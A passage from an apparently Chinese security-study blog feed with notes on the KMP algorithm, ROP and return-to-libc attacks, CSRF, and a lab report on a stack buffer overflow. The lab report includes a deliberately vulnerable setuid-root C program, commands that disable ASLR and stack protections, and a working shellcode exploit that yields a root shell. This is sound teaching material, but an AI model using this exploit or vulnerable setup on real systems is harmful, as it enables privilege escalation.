href="#四、KMP算法的改进" class="headerlink" title="四、KMP算法的改进"></a>四、KMP算法的改进</h2><p>例如：主串S=”aaaabcde”，子串T=”aaaaax”，其next数组值分别为012345，在开始的时候，当i=5、j=5的时候，我们发现“b”与”a”不相等，但是回溯之后，还是”a”和”b“比较，这其实是多余的比较，因为我们已经知道了”a”和”b”是必然不等的，所以这就是一个改进的地方。新增的next数组命名为：nextval数组。</p><p>KMP算法的改进为： <strong>如果a位字符与它next值指向的b位字符相等，则该a位的nextval就指向b位的nextval值，如果不等，则该a位的nextval值就是它自己a位的next值。</strong></p><p>PS：KMP算法确实非常的精妙，他的代码的简单性导致理解其中的逻辑非常的困难，在记录这次学习的过程中，也还是仅仅摸到了皮毛，日后再进行改进。。。。。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>代码重用攻击</title>
    <link href="/2023/03/06/%E4%BB%A3%E7%A0%81%E9%87%8D%E7%94%A8%E6%94%BB%E5%87%BB/"/>
    <url>/2023/03/06/%E4%BB%A3%E7%A0%81%E9%87%8D%E7%94%A8%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="代码重用攻击"><a href="#代码重用攻击" class="headerlink" title="代码重用攻击"></a>代码重用攻击</h1><h2 id="一、学习目标"><a href="#一、学习目标" class="headerlink" title="一、学习目标"></a>一、学习目标</h2><blockquote><p>理解代码重用攻击的原理</p><p>掌握代码重用攻击的攻击方式</p><p>设计代码重用攻击的防御方案</p></blockquote><h2 id="二、进程内存布局"><a href="#二、进程内存布局" class="headerlink" title="二、进程内存布局"></a>二、进程内存布局</h2><blockquote><p>栈：局部变量，函数参数，返回地址</p><p>堆：程序动态分配的内存</p><p>BSS段：未初始化的全局和静态变量</p><p>数据段：已初始化的全局变量和静态变量</p><p>代码段：程序代码</p></blockquote><h2 id="三、概念及原理"><a href="#三、概念及原理" class="headerlink" title="三、概念及原理"></a>三、概念及原理</h2><p><code>代码重用攻击</code>：栈缓存溢出后，将返回地址指向进程中已有代码，函数返回后，跳至攻击者指定已有代码继续执行，因重用了已存在代码，所以称为代码重用攻击</p><p><strong>return-to-libc</strong>：<strong>libc</strong>是几乎每个应用程序都包含的标准C语言库，包含了大量的基础函数实现，<strong>execve</strong>/<strong>system</strong>函数可以帮助打开<strong>shell</strong>,进行后续攻击</p><p>例如：通过攻击打开<strong>shell</strong></p><p>（1）得到字符串：<strong>\/bin\/sh</strong></p><p>思路一：从程序将要加载的动态库中寻找，为后续攻击做准备，我们只需要知道“/bin/sh”字符串的地址即可</p><p>思路二：通过shell的特性，自己构造<strong>\/bin\/sh</strong>字符串，但是实际上你进行攻击的时候，很多情况下是没有办法用shell来构造一个环境变量的</p><p>（2）为<strong>execve</strong>准备参数</p><p>​    32位x86架构linux系统中，参数传递通过<strong>栈</strong>来完成（下图中的<strong>rbp</strong>应该是<strong>ebp</strong>)，这里的话只需要自己构造栈就行，无需执行指令。</p><p><img src="/2023/03/06/%E4%BB%A3%E7%A0%81%E9%87%8D%E7%94%A8%E6%94%BB%E5%87%BB/image-20230306084652318.png" alt="image-20230306084652318"></p><p>​    64位x86架构linux系统中，参数传递通过<strong>栈+寄存器</strong>来完成，这里寄存器的值修改需要用到指令，可以用后面提到的<strong>ROP</strong>攻击</p><p><img src="/2023/03/06/%E4%BB%A3%E7%A0%81%E9%87%8D%E7%94%A8%E6%94%BB%E5%87%BB/image-20230306084740219.png" alt="image-20230306084740219"></p><p>（3）跳转到<strong>execve</strong>：打开<strong>libc</strong>中<strong>execve</strong>函数的地址</p><p>​    step 1：<strong>gdb</strong>中可以直接通过调试指令拿到</p><p><img src="/2023/03/06/%E4%BB%A3%E7%A0%81%E9%87%8D%E7%94%A8%E6%94%BB%E5%87%BB/image-20230306100230622.png" alt="image-20230306100230622"></p><p>​    step 2：利用栈缓存溢出将函数返回地址指向<strong>execve</strong>函数的地址</p><h2 id="四、ROP攻击"><a href="#四、ROP攻击" class="headerlink" title="四、ROP攻击"></a>四、<strong>ROP</strong>攻击</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">pop%eax<br>pop %ecx<br>mov%eax,(%ecx)<br>//修改任意内存<br></code></pre></td></tr></table></figure><p>​    因为在攻击过程中你的栈可以由你自己进行构造，所以上述三条指令可以达到修改任意地址下的数据</p><p><img src="/2023/03/06/%E4%BB%A3%E7%A0%81%E9%87%8D%E7%94%A8%E6%94%BB%E5%87%BB/image-20230306100558380.png" alt="image-20230306100558380"></p><p>可以利用的部分代码叫做<strong>Gadget</strong>，我们通过寻找合适的<strong>Gadget</strong>来构造一个<strong>Gadget Chain</strong>，然后并且构造合适的栈的内容来实现攻击。（上图中的<strong>rsp</strong>应该为<strong>esp</strong>）</p><p>所以分析程序中已有的可利用代码片段，利用<strong>ret</strong>指令将这些可利用代码片段串到一起，这种攻击方式称为<strong>ROP</strong>攻击</p><p><strong>Gadget自动提取工具：</strong><a href="https://github.com/JonathanSalwan/ROPgadget">JonathanSalwan/ROPgadget: This tool lets you search your gadgets on your binaries to facilitate your ROP exploitation. ROPgadget supports ELF, PE and Mach-O format on x86, x64, ARM, ARM64, PowerPC, SPARC and MIPS architectures. (github.com)</a></p><h2 id="五、如何防御ROP攻击"><a href="#五、如何防御ROP攻击" class="headerlink" title="五、如何防御ROP攻击"></a>五、如何防御ROP攻击</h2><p>（1）从二进制文件中构造<strong>Gadget Chain</strong>进行防御</p><p>​        1. 指令间填充</p><p><img src="/2023/03/06/%E4%BB%A3%E7%A0%81%E9%87%8D%E7%94%A8%E6%94%BB%E5%87%BB/image-20230306101816158.png" alt="image-20230306101816158"></p><p>​        如上图所示，单独看上面部分，只有<strong>movl</strong>指令和<strong>robl</strong>指令，没有<strong>ret</strong>指令，按理来说不具备成为<strong>Gadget</strong>的可能性，但是由于二进制指令是变长的，所以说从哪里开始我们无法确定，如果从<strong>04</strong>开始的话，<strong>04 d0 c3</strong>就构成了一个<strong>addb</strong>指令+<strong>ret</strong>指令，就成了一个<strong>Gadge</strong>t指令，所以说如果我们在指令之间填充<strong>nop</strong>指令的话，上面的代码片段就无法成为一个<strong>Gadget</strong>了，从而减少<strong>Gadget</strong>的数量。</p><p>​        2. 减少可用代码规模</p><p>​       <strong>libc</strong>中大部分代码很少被使用，程序加载的时候将这部分很少使用的代码直接映射位不可执行，就可以降低构建<strong>Gadget Chain</strong>的概率</p><p>（2）针对栈缓存溢出的防御机制</p><p>​        返回地址是因为栈缓存溢出而被修改的，所以说如果我们能够阻止栈缓存溢出，就可以阻止代码重用攻击。</p><p>（3）从执行Gadget Chain完成攻击进行防御</p><p>​        控制流完整性（<strong>Control Flow Integrity</strong>）检测</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>跨站请求伪造(CSRF)</title>
    <link href="/2023/03/05/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%88CSRF%EF%BC%89/"/>
    <url>/2023/03/05/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%88CSRF%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="跨站请求伪造（CSRF）"><a href="#跨站请求伪造（CSRF）" class="headerlink" title="跨站请求伪造（CSRF）"></a>跨站请求伪造（CSRF）</h1><h2 id="一、概念"><a href="#一、概念" class="headerlink" title="一、概念"></a>一、概念</h2><p>​        当一个网页给它所在的网站发送<strong>HTTP</strong>请求的时候，该请求被称为同站请求；如果该请求被发送到一个不同的网站，则该请求为跨站请求。来自网站自己页面的请求显然是可信的，而来自其他网站页面的请求则不一定可信。网站通常依靠回话<strong>cookie</strong>来判断一个来自客户端的请求是否可信，但是浏览器为同站请求和跨站请求添加了一模一样的<strong>cookie</strong>，如此一来便无法区分一个请求是来自自己的页面还是第三方页面。可以这么理解<strong>CSRF</strong>：攻击者首先盗用了你的身份，然后以你的名义进行某些非法操作。CSRF能够使用你的账户发送邮件，获取你的敏感信息，甚至盗走你的账户购买商品等。<strong>CSRF</strong>攻击其实是利用了<strong>web</strong>中用户身份认证验证的一个漏洞：简单的身份验证仅仅能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。</p><p><img src="/2023/03/05/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%88CSRF%EF%BC%89/image-20230305142140496.png" alt="image-20230305142140496"></p><h2 id="二、跨站请求伪造攻击"><a href="#二、跨站请求伪造攻击" class="headerlink" title="二、跨站请求伪造攻击"></a>二、跨站请求伪造攻击</h2><p><code>CSRF</code>攻击包括三部分：<code>目标用户</code>，<code>目标网站</code>，<code>由攻击者操纵的恶意网站</code></p><p>当用户访问恶意网站的时候，来自恶意网站的网页会发送伪造的HTTP请求给目标网站。</p><p>为了成功发动CSRF攻击，攻击者需要制作一个可以伪造跨站请求的网页，还需要引诱用户去访问该恶意网页。除此之外，用户还需要已经在目标网站登录，否则即使攻击者仍可以发送伪造请求，服务器也不会处理这些请求，而是会把用户引导到登录界面，并要求登录凭证，用户会立即察觉到问题，攻击就失效了。</p><p><img src="/2023/03/05/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%88CSRF%EF%BC%89/image-20230305143043503.png" alt="image-20230305143043503"></p><h2 id="三、攻击原理以及过程"><a href="#三、攻击原理以及过程" class="headerlink" title="三、攻击原理以及过程"></a>三、攻击原理以及过程</h2><blockquote><p>（1）用户打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A</p><p>（2）用户通过信息验证后，网站A产生Cookie信息并返回浏览器，此时用户登录网站A成功，可以正常发送请求到网站A</p><p>（3）用户未退出网站A之前，在同一浏览器中，打开一个tab页访问恶意网站</p><p>（4）恶意网站接收到用户请求后，返回一些攻击性代码，并发出一个请求访问第三方站点A</p><p>（5）浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并且不知道该请求是由B发起的，所以会根据用户的Cookie信息以该用户的权限处理该请求。</p></blockquote><p>可见，达到CSRF攻击，必须达到两个条件：<code>登录受信任站点A，并在本地生成Cookie</code>,<code>在不登出A的情况，访问恶意站点B</code></p><h2 id="四、常见的CSRF攻击类型"><a href="#四、常见的CSRF攻击类型" class="headerlink" title="四、常见的CSRF攻击类型"></a>四、常见的CSRF攻击类型</h2><p>(1)<code>GET</code>类型的<code>CSRF</code></p><p>(2)<code>POST</code>类型的<code>CSRF</code></p><p>他们两者的一个区别是如何在请求中附加数据，GET请求把数据附加在请求的URL中，而POST请求把数据附加在请求的数据字段中。</p><h2 id="五、防御措施"><a href="#五、防御措施" class="headerlink" title="五、防御措施"></a>五、防御措施</h2><p>（1）使用<code>referer</code>头</p><p>​        在<code>HTTP</code>请求头中的确有一个字段可以用来判断一个请求是否是跨站请求，就是<code>referer</code>头。他用来记录请求是从哪个网页发出的，它存储的是该网页的<code>URL</code>，使用<code>referer</code>字段服务器很容易判断一个请求是否来自它自己的网页。但是他会泄露使用者的浏览历史，产生隐私泄露问题，一些浏览器和代理会将此字段删除，以保护用户隐私，所以使用这个头字段作为防护策略可能会误把很多合法请求当做跨站请求。</p><p>（2）同站<code>cookie</code></p><p>​        给<code>cookie</code>添加了一个特殊的属性，称为<code>SameSite</code>属性，该属性由服务器进行设置，它告诉浏览器一个<code>cookie</code>是否可以被跨站请求使用，没有此属性的<code>cookie</code>会被附加到所有的请求上，不管是同站请求还是跨站请求。拥有此属性的<code>cookie</code>会附加到同站请求上，是否会附加到跨站请求上取决于该属性的具体值，<code>SameSite</code>有两个属性值：<code>Strict</code>和<code>Lax</code>，如果值是<code>Strict</code>，那么<code>cookie</code>将不会与跨站请求一起发送；如果值是<code>Lax</code>，那么<code>cookie</code>只有在顶级导航的跨站请求时才一起发送</p><p>（3）秘密令牌</p><p>​        网络应用判断一个请求是否是跨站，一个常用的方法就是秘密令牌，秘密令牌只有被自己的页面取得，其他网站的网页得不到，所有的同站请求都应当包含这个秘密令牌，这样就可以和跨站请求区分开，因为产生跨站请求的网页得不到秘密令牌。</p><p>​        秘密令牌的两种典型实现方法</p><pre><code class="hljs">    1. 在每个网页内嵌入一个随机的机密值，当请求从该页面发起时，该机密值被放在请求中。由于同源策略，不同源的网页不能访问此页面的内容，因此这些恶意网页就不能在跨站请求中包含正确的机密值。    1. 把机密值放在`cookie`中，当一个请求发起后，请求从`cookie`中读出该机密值并将它包含在请求的数据字段中。该字段独立于已经被浏览器包含在`HTTP`头中的`cookie`，由于同源策略，不同源的页面不能读取其他源的`cookie`内容，因此攻击者无法在请求的数据字段包含该机密值。</code></pre><h2 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h2><p>​        在一个跨站请求伪造攻击中，目标用户被诱骗去访问攻击者的网页，同时还需要维护与目标网站的活跃会话，当用户访问攻击者的网页的时候，攻击者可以伪造一个请求，从恶意网页发送到目标网站。如果目标网站不能识别一个请求究竟是来自他的网页还是一个不可信任的第三方网页，那么就会产生问题，因为执行攻击者伪造的请求会产生安全威胁。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>代码漏洞分析与缓冲区溢出攻击</title>
    <link href="/2023/03/04/%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/"/>
    <url>/2023/03/04/%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="代码漏洞分析与缓冲区溢出攻击"><a href="#代码漏洞分析与缓冲区溢出攻击" class="headerlink" title="代码漏洞分析与缓冲区溢出攻击"></a>代码漏洞分析与缓冲区溢出攻击</h1><h2 id="一、实验目的"><a href="#一、实验目的" class="headerlink" title="一、实验目的"></a>一、实验目的</h2><ol><li>了解代码漏洞扫描的基本原理； </li><li>熟悉缓冲区溢出攻击与防御的基本技术</li><li>熟悉如何发现常见软件漏洞(stack overflow, double free, format string vulnerability, etc)</li><li>按照实验步骤进行操作，攻击漏洞程序并获得 root 权限。</li></ol><h2 id="二、实验环境"><a href="#二、实验环境" class="headerlink" title="二、实验环境"></a>二、实验环境</h2><p><strong>64位Kali linux</strong>    <strong>vmware workstation 16 player</strong></p><h2 id="三、实验原理"><a href="#三、实验原理" class="headerlink" title="三、实验原理"></a>三、实验原理</h2><p>​    缓冲区溢出是指程序试图向缓冲区写入超出预分配固定长度数据的情况。这一漏洞可以被恶意用户利用来改变程序的流控制，甚至执行代码的任意片段。这一漏洞的出现是由于数据缓冲器和返回地址的暂时关闭，溢出会引起返回地址被重写。</p><h2 id="四、实验步骤与结果分析"><a href="#四、实验步骤与结果分析" class="headerlink" title="四、实验步骤与结果分析"></a>四、实验步骤与结果分析</h2><p>该实验我个人使用的是 64 位 Kali linux，而本次实验为了方便观察汇编语句，我们需要在 32 位环境下作 操作，因此实验之前需要做一些准备。</p><p>（1）<strong>输入命令安装一些用于编译 32 位 C 程序的东西</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get update<br>sudo apt-get install -y lib32z1 libc6-dev-i386 lib32readline6-dev<br></code></pre></td></tr></table></figure><p><img src="/2023/03/04/%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-20230304150033257.png" alt="image-20230304150033257"></p><p><img src="/2023/03/04/%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-20230304150020838.png" alt="image-20230304150020838">（2)  <strong>初始设置</strong></p><p><strong>关闭地址空间随机化</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo sysctl -w kernel.randomize_va_space=0<br></code></pre></td></tr></table></figure><p><img src="/2023/03/04/%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-20230304150001996.png" alt="image-20230304150001996"></p><p>为了防范缓冲区溢出攻击及其它利用 shell 程序的攻击，许多 shell 程序在被调用时自动放弃它们的特权。因此，即使你能欺骗一个 Set-UID 程序调用一个 shell，也不能在这个 shell 中保持 root权限，所以我们需要使用一个没有此项保护的shell，例如：zsh，如下链接完毕</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">ln</span> -sf /bin/zsh /bin/sh<br></code></pre></td></tr></table></figure><p><img src="/2023/03/04/%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-20230304150135987.png" alt="image-20230304150135987"></p><p>（3）<strong>shellcode</strong></p><p>一般情况下，缓冲区溢出会造成程序崩溃，在程序中，溢出的数据覆盖了返回地址。而如果覆盖返回地址的数据是另一个地址，那么程序就会跳转到该地址，如果该地址存放的是一段精心设计的代码用于实现其他功能，这段代码就是 shellcode。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">char</span> *name[<span class="hljs-number">2</span>];<br>    name[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;/bin/sh&quot;</span>;<br>    name[<span class="hljs-number">1</span>] = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-built_in">execve</span>(name[<span class="hljs-number">0</span>], name, <span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>此段代码对应的机器码如下：</p><p><img src="/2023/03/04/%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-20230304150741432.png" alt="image-20230304150741432"></p><p>（4）漏洞程序，保存为stack.c</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">bof</span><span class="hljs-params">(<span class="hljs-type">char</span> *str)</span></span>&#123;<br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">12</span>];<br>    <span class="hljs-comment">/* The following statement has a buffer overflow problem */</span><br>    <span class="hljs-built_in">strcpy</span>(buffer, str);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span></span>&#123;<br>    <span class="hljs-type">char</span> str[<span class="hljs-number">517</span>];<br>    FILE *badfile;<br>    badfile = <span class="hljs-built_in">fopen</span>(<span class="hljs-string">&quot;badfile&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-built_in">fread</span>(str, <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">char</span>), <span class="hljs-number">517</span>, badfile);<br>    <span class="hljs-built_in">bof</span>(str);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Returned Properly\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>通过代码可以知道，程序会读取一个名为“badfile”的文件，并将文件内容装入“buffer”。 </p><p>（5）编译该程序，并设置 SET-UID。 </p><p>​    GCC 编译器实现了一个名为 stackguard 的安全机制来防止缓冲区溢出。在存在这种保护的情况下， 缓冲区溢出攻击将不起作用。我们可以在编译期间使用-fno-stack-protector 选项禁用此保护。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -m32 -g -z execstack -fno-stack-protector -o stack stack.c<br>sudo <span class="hljs-built_in">chown</span> root stack<br>sudo <span class="hljs-built_in">chmod</span> 4755 stack<br></code></pre></td></tr></table></figure><p><img src="/2023/03/04/%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-20230304150602247.png" alt="image-20230304150602247"></p><p><strong>–fno-stack-protector</strong> 关闭<strong>canary</strong>保护机制</p><p><strong>-g</strong> 增加调试信息，保证后面我们可以对stack进行调试</p><p><strong>-z execstack</strong>   shellcode最终在栈里面执行，关闭<strong>栈不可执行</strong>的保护机制</p><p>（6）攻击程序： <strong>exploit.c</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* exploit.c */</span><br><span class="hljs-comment">/* A program that creates a file containing code for launching shell*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-type">char</span> shellcode[]=<br>    <span class="hljs-string">&quot;\x31\xc0&quot;</span>                  <span class="hljs-comment">//xorl %eax,%eax</span><br>    <span class="hljs-string">&quot;\x50&quot;</span>                      <span class="hljs-comment">//pushl %eax</span><br>    <span class="hljs-string">&quot;\x68&quot;</span><span class="hljs-string">&quot;//sh&quot;</span>                <span class="hljs-comment">//pushl $0x68732f2f</span><br>    <span class="hljs-string">&quot;\x68&quot;</span><span class="hljs-string">&quot;/bin&quot;</span>                <span class="hljs-comment">//pushl $0x6e69622f</span><br>    <span class="hljs-string">&quot;\x89\xe3&quot;</span>                  <span class="hljs-comment">//movl %esp,%ebx</span><br>    <span class="hljs-string">&quot;\x50&quot;</span>                      <span class="hljs-comment">//pushl %eax</span><br>    <span class="hljs-string">&quot;\x53&quot;</span>                      <span class="hljs-comment">//pushl %ebx</span><br>    <span class="hljs-string">&quot;\x89\xe1&quot;</span>                  <span class="hljs-comment">//movl %esp,%ecx</span><br>    <span class="hljs-string">&quot;\x99&quot;</span>                      <span class="hljs-comment">//cdq</span><br>    <span class="hljs-string">&quot;\xb0\x0b&quot;</span>                  <span class="hljs-comment">//movb $0x0b,%al</span><br>    <span class="hljs-string">&quot;\xcd\x80&quot;</span>                  <span class="hljs-comment">//int $0x80</span><br>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">517</span>];<br>    FILE *badfile;<br>    <span class="hljs-comment">/* Initialize buffer with 0x90 (NOP instruction) */</span><br>    <span class="hljs-built_in">memset</span>(&amp;buffer, <span class="hljs-number">0x90</span>, <span class="hljs-number">517</span>);<br>    <span class="hljs-comment">/* You need to fill the buffer with appropriate contents here */</span><br>    buffer[<span class="hljs-number">24</span>]=<span class="hljs-number">0xdd</span>;<br>    buffer[<span class="hljs-number">25</span>]=<span class="hljs-number">0xcf</span>;<br>    buffer[<span class="hljs-number">26</span>]=<span class="hljs-number">0xff</span>;<br>    buffer[<span class="hljs-number">27</span>]=<span class="hljs-number">0xff</span>;<br>    <span class="hljs-type">int</span> start=<span class="hljs-number">517</span>-<span class="hljs-built_in">strlen</span>(shellcode);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=start;i&lt;<span class="hljs-number">517</span>;i++)&#123;<br>        buffer[i]=shellcode[i-start];<br>    &#125;<br>    <span class="hljs-comment">/* Save the contents to the file &quot;badfile&quot; */</span><br>    badfile = <span class="hljs-built_in">fopen</span>(<span class="hljs-string">&quot;./badfile&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br>    <span class="hljs-built_in">fwrite</span>(buffer, <span class="hljs-number">517</span>, <span class="hljs-number">1</span>, badfile);<br>    <span class="hljs-built_in">fclose</span>(badfile);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>exploit.c</strong>文件用于生成<strong>badfile</strong>文件</p><p>我们需要填充的部分就是将<strong>shellcode</strong>放进去，然后将<strong>return address</strong>的值修改为<strong>shellcode</strong>的入口地址即可，下面我们进行调试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">gdb stack<br>b bof     //设置断点<br>r         //运行<br>next      //进入下一步<br>i r ebp   //查看ebp的值<br>i r esp   //查看esp的值<br>p &amp;buffer //查看数组buffer的起始地址<br></code></pre></td></tr></table></figure><p><img src="/2023/03/04/%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-20230304151656195.png" alt="image-20230304151656195"></p><p>ebp的地址0xffffce08+4的地方就是return address，这里我讲shellcode放在了buffer[517]里面最后的24字节，那这样shellcode的入口地址就应该是[&amp;buffer+517-strlen(shellcode)]=0xffffcdf4+493=0xffffcfdd；</p><p>将入口地址0xffffcfdd填入到return address处，对应的buffer应该是buffer[24]、buffer[25]、buffer[26]、buffer[27]</p><p>小端法存储，所以</p><p><img src="/2023/03/04/%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-20230304152058897.png" alt="image-20230304152058897"></p><p>编译<strong>exploit.c</strong>，并运行<strong>exploit</strong>，此时生成了<strong>badfile</strong>文件，运行<strong>stack</strong>即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -m32 -o exploit exploit.c<br>./exploit<br>./stack<br></code></pre></td></tr></table></figure><p><img src="/2023/03/04/%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-20230304152309622.png" alt="image-20230304152309622"></p><p>最终发现得到<strong>root</strong>权限的<strong>shell</strong></p><h2 id="五、拓展"><a href="#五、拓展" class="headerlink" 